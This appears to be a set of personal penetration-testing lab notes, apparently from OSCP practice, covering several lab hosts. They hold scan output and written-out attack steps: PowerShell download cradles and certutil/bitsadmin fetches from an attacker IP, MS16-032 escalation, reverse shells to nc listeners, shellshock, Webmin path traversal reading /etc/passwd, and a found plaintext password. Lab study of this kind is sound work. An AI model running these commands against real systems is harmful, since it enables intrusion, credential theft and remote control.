IP: 10.11.1.31:139	Name: 10.11.1.31                                        <br />	Disk                                                  	Permissions<br />	----                                                  	-----------<br />	C$                                                	NO ACCESS<br />	IPC$                                              	NO ACCESS<br />	ADMIN$                                            	NO ACCESS<br />	wwwroot                                           	READ ONLY<br />	.\<br />	dr--r--r--                0 Tue Jan  5 01:25:34 2016	.<br />	dr--r--r--                0 Tue Jan  5 01:25:34 2016	..<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	aspnet_client<br />	-r--r--r--             1292 Tue Jan  5 02:04:42 2016	base-login.asp<br />	-r--r--r--             1292 Tue Jan  5 02:04:42 2016	base-login.txt<br />	-r--r--r--             1433 Tue Jan  5 02:04:42 2016	iisstart.htm<br />	dr--r--r--                0 Mon Feb 18 09:23:07 2008	images<br />	-r--r--r--             1369 Tue Jan  5 02:04:42 2016	login-off.asp<br />	-r--r--r--             1369 Tue Jan  5 02:04:42 2016	login-off.asp.txt<br />	-r--r--r--             2806 Tue Jan  5 02:04:42 2016	pagerror.gif<br />	-r--r--r--             2439 Tue Jan  5 02:04:42 2016	postinfo.html<br />	-r--r--r--              121 Tue Jan  5 02:04:42 2016	restricted.htm<br />	dr--r--r--                0 Mon Feb 18 09:23:07 2008	_private<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	_vti_cnf<br />	-r--r--r--             1754 Tue Jan  5 02:04:42 2016	_vti_inf.html<br />	dr--r--r--                0 Mon Feb 18 09:23:07 2008	_vti_log<br />	dr--r--r--                0 Mon Jan  4 22:32:57 2016	_vti_pingit<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	_vti_pvt<br />	dr--r--r--                0 Mon Feb 18 09:23:07 2008	_vti_script<br />	dr--r--r--                0 Mon Feb 18 09:23:07 2008	_vti_txt<br />	.\\aspnet_client\<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	.<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	..<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	system_web<br />	.\\aspnet_client\system_web\<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	.<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	..<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	1_1_4322<br />	.\\aspnet_client\system_web\1_1_4322\<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	.<br />	dr--r--r--                0 Mon Feb 18 09:23:39 2008	..<br />	-r--r--r--               15 Tue Feb  9 08:14:15 2010	SmartNav.htm<br />	-r--r--r--             9427 Tue Feb  9 08:14:15 2010	SmartNav.js<br />	-r--r--r--            14482 Tue Feb  9 08:14:15 2010	WebUIValidation.js<br />	.\\_vti_cnf\<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	.<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	..<br />	-r--r--r--              681 Mon Feb 18 09:23:08 2008	iisstart.htm<br />	-r--r--r--              313 Mon Feb 18 09:23:08 2008	pagerror.gif<br />	.\\_vti_pingit\<br />	dr--r--r--                0 Mon Jan  4 22:32:57 2016	.<br />	dr--r--r--                0 Mon Jan  4 22:32:57 2016	..<br />	-r--r--r--              150 Tue Jan  5 02:05:10 2016	pingit.html<br />	-r--r--r--              293 Tue Jan  5 02:05:10 2016	pingit.py<br />	.\\_vti_pvt\<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	.<br />	dr--r--r--                0 Mon Feb 18 09:23:08 2008	..<br />	-r--r--r--              112 Mon Feb 18 09:23:08 2008	access.cnf<br />	-r--r--r--               25 Mon Feb 18 09:23:08 2008	botinfs.cnf<br />	-r--r--r--               25 Mon Feb 18 09:23:08 2008	bots.cnf<br />	-r--r--r--              324 Mon Feb 18 09:23:08 2008	deptodoc.btr<br />	-r--r--r--             5616 Mon Feb 18 09:23:08 2008	doctodep.btr<br />	-r--r--r--                0 Mon Feb 18 09:23:08 2008	frontpg.lck<br />	-r--r--r--             5636 Mon Feb 18 09:23:08 2008	linkinfo.btr<br />	-r--r--r--              975 Mon Feb 18 09:23:08 2008	service.cnf<br />	-r--r--r--                0 Mon Feb 25 14:46:39 2008	service.lck<br />	-r--r--r--                3 Mon Feb 18 09:23:08 2008	services.cnf<br />	-r--r--r--               66 Mon Feb 18 09:23:08 2008	svcacl.cnf<br />	-r--r--r--                0 Mon Feb 18 09:23:08 2008	uniqperm.cnf<br />	-r--r--r--               25 Mon Feb 18 09:23:08 2008	writeto.cnf<br /></div><div class='page'><h1 class='title level-6'>nmap vuln scan smb</h1><br/>nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.11.1.31<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-19 10:58 EST<br />NSE: Loaded 7 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 10:58<br />Completed NSE at 10:58, 0.00s elapsed<br />Initiating ARP Ping Scan at 10:58<br />Scanning 10.11.1.31 [1 port]<br />Completed ARP Ping Scan at 10:58, 0.10s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 10:58<br />Completed Parallel DNS resolution of 1 host. at 10:58, 0.05s elapsed<br />Initiating SYN Stealth Scan at 10:58<br />Scanning 10.11.1.31 [2 ports]<br />Discovered open port 139/tcp on 10.11.1.31<br />Discovered open port 445/tcp on 10.11.1.31<br />Completed SYN Stealth Scan at 10:58, 0.10s elapsed (2 total ports)<br />NSE: Script scanning 10.11.1.31.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 10:58<br />Completed NSE at 10:58, 5.30s elapsed<br />Nmap scan report for 10.11.1.31<br />Host is up, received arp-response (0.042s latency).<br />Scanned at 2019-11-19 10:58:50 EST for 6s<br /><br />PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack ttl 128<br />445/tcp open  microsoft-ds syn-ack ttl 128<br />MAC Address: 00:50:56:89:51:86 (VMware)<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br />|       <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 10:58<br />Completed NSE at 10:58, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Nmap done: 1 IP address (1 host up) scanned in 5.92 seconds<br />           Raw packets sent: 3 (116B) | Rcvd: 43 (9.796KB)</div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/417-1.png" alt="images/417-1.png" /></a></div><div class='page'><h1 class='title level-5'>proof</h1><br/>26b4cb0930a3e3be4da8e9d738607427 <br /></div><div class='page'><h1 class='title level-4'>50</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>alice<br />bethany<br />ann<br />lee<br />ian<br />nick<br />pedro<br /><br />[+] Version detected: 7.28<br /><br /><br />python 39161.py 10.11.1.49 9505<br /><br /><br /><br />from powershell empire take the Invoke-MS16032.ps1 script and add                Invoke-MS16032 -Command C:\Users\kostas\Downloads\Invoke-PowerShellTcp.ps1                      to the bottom<br />from powershell empire take the Invoke-PowershellTCP.ps1 script and add          Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3233                                         to the bottom<br />host both of the files<br />bitsadmin /transfer Ms16032Job /download <a href="http://10.10.14.60/Sherlock.ps1">http://10.10.14.60/Invoke-MS16032.ps1</a> C:\users\kostas\Downloads\Invoke-MS16032.ps1<br />same for invoke powershell script<br />in terminal<br />    nc -nlvp 3233<br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\kostas\Downloads\Invoke-MS16032.ps1 (this is important because ms16032 exploits powershell v1.0)<br />&#39;HOLY HANDLE LEAK BATMAN!&quot; enjoy your shell<br /><br /><br /><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.11.0.186:8000/MS16-032.ps1&quot;</a><br />certutil.exe -urlcache -split -f &quot;<a href="http://10.11.0.186:8000/MS16-032.ps1"">http://10.11.0.186:8032/Invoke-PowerShellTcp.ps1&quot;</a><br /><br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -ExecutionPolicy ByPass -command &quot;&amp; { . C:\Users\Bethany\AppData\Local\Temp\MS16-032.ps1 }&quot;<br /><br /><br />powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186:8032/Invoke-PowershellTcp.ps1')"">http://10.11.0.186:80/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br /><br /><br /><br /><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.11.0.186:8000/MS16_032.ps1&#39;);Invoke-MS16-032 &quot;-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.11.0.186:8032/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.11.0 -Port 3233&quot;  </code></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.50<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-13 11:12 EST<br />Nmap scan report for 10.11.1.50<br />Host is up (0.034s latency).<br />Not shown: 996 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />49155/tcp open  unknown<br />MAC Address: 00:50:56:89:12:DE (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds<br /><br /><br /><br /><br /><br />nmap -sC -sV -p- 10.11.1.50<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-13 11:13 EST<br />Nmap scan report for 10.11.1.50<br />Host is up (0.042s latency).<br />Not shown: 65530 filtered ports<br />PORT      STATE SERVICE     VERSION<br />80/tcp    open  http        Microsoft IIS httpd 8.5<br />|_http-generator: Drupal 7 (http://drupal.org)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Microsoft-IIS/8.5<br />|_http-title: Welcome to Bethany&amp;#039;s Page | Bethany&amp;#039;s Page<br />135/tcp   open  msrpc       Microsoft Windows RPC<br />139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn<br />9505/tcp  open  http        HttpFileServer httpd<br />|_http-title: /<br />49155/tcp open  msrpc       Microsoft Windows RPC<br />MAC Address: 00:50:56:89:12:DE (VMware)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_smb2-security-mode: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry!<br />|_smb2-time: ERROR: Script execution failed (use -d to debug)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 225.78 seconds<br />root@kali:~/Desktop/Machines/OSCP/50# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.50:80">http://10.11.1.50:80</a> --simple-report dirsearchsimple_10.11.1.50:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-13_11-13-53.log<br /><br />Target: <a href="http://10.11.1.50:80">http://10.11.1.50:80</a><br /><br />[11:13:53] Starting: <br />[11:13:54] 403 -   58B  - /misc/<br />[11:13:54] 403 -   58B  - /themes/<br />[11:13:54] 403 -   58B  - /modules/<br />[11:13:55] 403 -   58B  - /scripts/<br />[11:13:56] 403 -   58B  - /sites/<br />[11:13:56] 403 -   58B  - /includes/<br />[11:13:57] 403 -   58B  - /profiles/<br />[11:13:58] 403 -   58B  - /Misc/<br />[11:14:00] 403 -   58B  - /Themes/<br />[11:14:13] 403 -   58B  - /Scripts/<br />[11:14:19] 403 -   58B  - /Modules/<br />[11:14:42] 403 -   58B  - /Sites/<br />[11:15:57] 403 -   58B  - /Profiles/<br />[11:16:41] 403 -   58B  - /SITES/<br />[11:17:26] 403 -   58B  - /Includes/<br />[11:18:42] 403 -   58B  - /MISC/<br />[11:21:03] 403 -   58B  - /SCRIPTS/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.50:80">http://10.11.1.50:80</a> | tee nikto_10.11.1.50:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.50<br />+ Target Hostname:    10.11.1.50<br />+ Target Port:        80<br />+ Start Time:         2019-11-13 12:15:49 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/8.5<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Entry &#39;/INSTALL.mysql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.pgsql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.sqlite.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/LICENSE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/MAINTAINERS.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/UPGRADE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=admin/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=comment/reply/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=node/add/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/register/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/logout/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 36 entries which should be manually viewed.<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ OSVDB-3092: /README.TXT: This might be interesting...<br />+ OSVDB-3092: /readme.txt: This might be interesting...<br />+ OSVDB-3092: /UPGRADE.txt: Default file found.<br />+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.<br />+ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.<br />+ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ OSVDB-3092: /LICENSE.TXT: License file found may identify site software.<br />+ 8383 requests: 0 error(s) and 29 item(s) reported on remote host<br />+ End Time:           2019-11-13 12:21:41 (GMT-5) (352 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-4'>71 Alpha</h1><br/>nmap showed  ssh and 80<br />nikto showed that a certain page was vulnerable to shellshock<br />cracked open burp, replaced the useragent with shellshock, started listener, boom!! www-data shell!!<br />/etc/passwd showed me the user gibson<br />from /var       grep -C2  -r root 2&gt; /dev/null | grep pass   and we got some stuff!!<br />zaq1xsw2cde3        now lets try it<br />su -l root .... no dice<br />su -l gibson ... yee!! we are now gibson<br />sudo -l shows us we can do it all<br />sudo -l /bin/bash -i<br />whoami<br />rooted</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.71<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 21:34 EST<br />Nmap scan report for 10.11.1.71<br />Host is up (0.044s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />22/tcp open  ssh<br />80/tcp open  http<br />MAC Address: 00:50:56:93:6D:3E (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds<br />root@kali:~/Desktop/Machines/OSCP/71# <br /></div><div class='page'><h1 class='title level-6'>big nmap</h1><br/><br />nmap -sC -sV -p- 10.11.1.71<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 21:35 EST<br />Nmap scan report for 10.11.1.71<br />Host is up (0.044s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 1a:f6:a7:0d:ed:c2:73:a1:6f:a3:08:68:28:b5:3b:bb (RSA)<br />|   256 e6:43:89:59:f9:85:d8:e2:bb:e3:d7:ed:28:5c:c5:65 (ECDSA)<br />|_  256 3b:0b:f3:84:3c:7d:6e:2b:2c:81:11:94:16:9b:71:7d (ED25519)<br />80/tcp open  http?<br />MAC Address: 00:50:56:93:6D:3E (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 744.45 seconds<br />root@kali:~/Desktop/Machines/OSCP/71# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.71:80">http://10.11.1.71:80</a> --simple-report dirsearchsimple_10.11.1.71:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-20_21-36-05.log<br /><br />Target: <a href="http://10.11.1.71:80">http://10.11.1.71:80</a><br /><br />[21:36:05] Starting: <br />[21:36:05] 403 -  281B  - /.php<br />[21:36:05] 302 -    0B  - /index.php  -&gt;  site/index.php/<br />[21:36:05] 403 -  285B  - /cgi-bin/<br />[21:37:44] 200 -    2KB - /templates/<br />[21:37:44] 403 -  283B  - /icons/<br />[21:37:45] 200 -    7KB - /site/<br />[21:37:49] 200 -    2KB - /core/<br />[21:37:50] 200 -    1KB - /custom/<br />[21:37:52] 403 -  288B  - /javascript/<br />[21:37:52] 200 -    2KB - /cache/<br />[21:38:52] 200 -    8KB - /phpmyadmin/<br />[21:49:08] 403 -  291B  - /server-status/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br />root@kali:~/Desktop/Machines/OSCP/71# </div><div class='page'><h1 class='title level-6'>nikto</h1><br/><br />nikto -host <a href="http://10.11.1.71:80">http://10.11.1.71:80</a> | tee nikto_10.11.1.71:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.71<br />+ Target Hostname:    10.11.1.71<br />+ Target Port:        80<br />+ Start Time:         2019-11-20 21:36:04 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.7 (Ubuntu)<br />+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.4<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Root page / redirects to: site/index.php/<br />+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).</a><br />+ OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).</a><br />+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 0<br />+ OSVDB-3092: /cgi-bin/admin.cgi: This might be interesting...<br />+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...<br />+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-3092: /license.txt: License file found may identify site software.<br />+ /phpmyadmin/: phpMyAdmin directory found<br />+ 8502 requests: 4 error(s) and 14 item(s) reported on remote host<br />+ End Time:           2019-11-20 21:46:21 (GMT-5) (617 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/OSCP/71# <br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>97f3446c2c2fc5079f22dc38f60c8a78<br /></div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/452-1.png" alt="images/452-1.png" /></a></div><div class='page'><h1 class='title level-4'>125 Sherlock</h1><br/>nmap showed that 21 was the only open port, and was running femitter<br />anonymous login was enabled and I was able to browse files.<br />put fuckyou.txt       works! we can write to disk!! now to execute... <br />searchsploit told me that femitter allows directory browsing ../../../../<br />dir ../../../../Docume~1/admini~1/Bureau/           showed that I could see proof.txt   <br />                                                                            (Docume~1 because old windows machines cant read long names, just first 6 letters and ~1)<br />                                                                            (bureau because it is a french distro)<br /><br />get ../../../../Docume~1/admini~1/Bureau/proof.txt       &lt;failed<br /><br /> ftp&gt; recv<br />(remote-file) ../../../../Docume~1/admini~1/Bureau/proof.txt<br />(local-file) proof.txt<br />success<br /><br />now we can read proof.txt, but we still don&#39;t have a real shell.<br />google searching got me to<br /><a href="https://github.com/SinghDaljeet/SinghDaljeet.github.io/blob/master/_posts/2019-02-16-femitter.md">https://github.com/SinghDaljeet/SinghDaljeet.github.io/blob/master/_posts/2019-02-16-femitter.md</a><br /><br />python femitter.py 10.11.0.186 443<br />...<br />Administrateur!!! (rooted)<br /><br /><br /><br />                                                                         <br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.125<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 12:38 EST<br />Nmap scan report for 10.11.1.125<br />Host is up (0.045s latency).<br />Not shown: 998 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />4444/tcp closed krb524<br />MAC Address: 00:50:56:89:6A:74 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.03 seconds<br /><br /><br /><br />nmap -sC -sV -p- 10.11.1.125<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 12:38 EST<br />Nmap scan report for 10.11.1.125<br />Host is up (0.054s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE  SERVICE VERSION<br />21/tcp   open   ftp     Acritum Femitter Server ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 . [NSE: writeable]<br />| drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 .. [NSE: writeable]<br />| -rw-rw-rw-   1 ftp      ftp        11164 Dec 26  2006 house.jpg [NSE: writeable]<br />| -rw-rw-rw-   1 ftp      ftp          920 Jan 03  2007 index.htm [NSE: writeable]<br />|_drw-rw-rw-   1 ftp      ftp            0 Sep 23  2015 Upload [NSE: writeable]<br />|_ftp-bounce: bounce working!<br />| ftp-syst: <br />|_  SYST: Internet Component Suite<br />123/tcp  closed ntp<br />4444/tcp closed krb524<br />MAC Address: 00:50:56:89:6A:74 (VMware)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 256.54 seconds<br /></div><div class='page'><h1 class='title level-5'>proof.txt</h1><br/>10.11.1.125 sherlock <br />    dae9aad6636a1c2c330b435e5d1f8120<br /></div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/401-1.png" alt="images/401-1.png" /></a></div><div class='page'><h1 class='title level-4'>141 FC4</h1><br/>webserver will execute cgi<br />pl shellcode named shell.cgi<br />curl to execute<br />yeet cannon!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="https://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/">https://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/</a><br /><br /><br />msf5 auxiliary(admin/webmin/file_disclosure)<br /><br /><br /><br />curl http://10.11.1.141:10000/unauthenticated//..%01/..%01/..%01/..%01/..%01/etc/passwd</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=64e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.11.1.141<br />ttl=64<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-26 12:47 EST<br />Nmap scan report for 10.11.1.141<br />Host is up (0.038s latency).<br />Not shown: 997 closed ports<br />PORT      STATE SERVICE<br />22/tcp    open  ssh<br />111/tcp   open  rpcbind<br />10000/tcp open  snet-sensor-mgmt<br />MAC Address: 00:50:56:89:56:41 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 1.92 seconds</div><div class='page'><h1 class='title level-6'>reg nmap</h1><br/>nmap -sC -sV -p- 10.11.1.141<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-26 12:53 EST<br />Nmap scan report for 10.11.1.141<br />Host is up (0.041s latency).<br />Not shown: 65532 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 4.0 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 fe:cd:bb:f6:36:d4:59:62:92:b4:10:e4:75:04:43:54 (DSA)<br />|_  1024 9a:99:25:75:ac:04:e5:f9:f7:21:c6:f5:88:4f:12:6a (RSA)<br />111/tcp   open  rpcbind 2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|_  100000  2            111/udp  rpcbind<br />10000/tcp open  http    MiniServ 0.01 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br />MAC Address: 00:50:56:89:56:41 (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 100.92 seconds<br /></div><div class='page'><h1 class='title level-6'>/etc/passwd</h1><br/>root:x:0:0:root:/root:/bin/bash<br />bin:x:1:1:bin:/bin:/sbin/nologin<br />daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />adm:x:3:4:adm:/var/adm:/sbin/nologin<br />lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />sync:x:5:0:sync:/sbin:/bin/sync<br />shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />halt:x:7:0:halt:/sbin:/sbin/halt<br />mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />news:x:9:13:news:/etc/news:<br 